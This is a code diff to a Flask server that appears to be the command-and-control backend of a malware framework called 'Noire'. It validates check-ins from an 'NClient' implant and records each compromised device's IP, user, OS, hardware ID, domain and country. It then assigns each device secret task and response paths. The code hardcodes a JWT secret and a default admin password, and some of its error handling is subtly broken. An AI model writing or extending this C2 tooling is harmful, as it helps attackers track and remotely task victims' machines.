@@ -1,10 +1,10 @@
 import flask
 from flask_sqlalchemy import SQLAlchemy
 import flask_login
+import os
 import secrets
 import bcrypt
 import jwt
-import random
 from eventlet import wsgi, listen
 
 app = flask.Flask(__name__)
@@ -63,12 +63,14 @@ class Device(db.Model):
     ip = db.Column(db.String)
     user = db.Column(db.String)
     os = db.Column(db.String)
+    domain = db.Column(db.String)
+    country = db.Column(db.String)
     hwid = db.Column(db.String)
     notes = db.Column(db.String)
     initialConnection = db.Column(db.String)
     uniquePath = db.Column(db.String)
     taskPath = db.Column(db.String)
-    reponsePath = db.Column(db.String)
+    responsePath = db.Column(db.String)
     
     def get_id(self):
         return self.id
@@ -146,6 +148,9 @@ with app.app_context():
     a = addAccount('admin', 'test', True)
     a = None
     #Delete all known links for devices, so new can be generated
+    if Device.query.get('%'):
+        for dev in Device.query.get('%'):
+            dev.uniquePath, dev.taskPath, dev.responsePath = '', '', ''
 
 @app.errorhandler(404)
 def not_found(error):
@@ -154,6 +159,16 @@ def not_found(error):
 @app.route('/')
 def indexPage():
     return flask.redirect(flask.url_for('loginPage'))
+
+#Load icon and CSS stylesheet
+@app.route('/favicon.ico')
+def favicon():
+    return flask.send_from_directory(os.path.join(app.root_path, 'static'),
+                               'favicon.ico', mimetype='image/vnd.microsoft.icon')
+
+@app.route('/style.css')
+def stylesheel():
+    return flask.send_from_directory(os.path.join(app.root_path, 'static'), 'style.css')
 
 @app.route('/login', methods=['POST', 'GET'])
 def loginPage():
@@ -198,17 +213,25 @@ def overviewPage():
 def validateC2Client(request:flask.request) -> bool:
     try:
         if request.headers['User-Agent'].split()[0] != "NClient": return False
-        request.headers['NClient-Token']
+        cToken = request.headers['NClient-Token']
+        cToken = jwt.decode(cToken, "Noire", algorithms=["HS256"])
+        #if cToken['ip'] != request.remote_addr: return False #Blocks Proxies, VPN's and LAN devices
+        cToken['os']
+        cToken['user']
+        cToken['hwid']
+        cToken['time']
+        cToken['country']
+        cToken['domain']
         #add check for payload, validate encryption etc
         #Add check if NClient-Token (jwt) IP is same as request IP
         return True
-    except KeyError:
+    except KeyError or jwt.DecodeError:
         return False
 
 def generateRandPath() -> str:
     x = ""
     for y in range(12):
-        x += random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
+        x += secrets.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
     return x
 
 @app.route('/contact')
@@ -216,11 +239,11 @@ def contactC2Page():
     if not validateC2Client(flask.request): return not_found("Invalid")
     jwT = flask.request.headers['NClient-Token']
     if not Device.query.get(jwT):
-        token = jwt.decode(jwT, "Noire", algorithms="HS256")
+        token = jwt.decode(jwT, "Noire", algorithms=["HS256"])
         uP, tP, rP = generateRandPath(), generateRandPath(), generateRandPath()
         newClient = Device(jwt=jwT, ip=token['ip'], os=token['os'], user=token['user'],
                            hwid=token['hwid'], uniquePath=uP, taskPath=tP, responsePath=rP,
-                           initialConnection=token['time'])
+                           initialConnection=token['time'], country=token['country'], domain=token['domain'])
         db.session.add(newClient)
         db.session.commit()
     else:
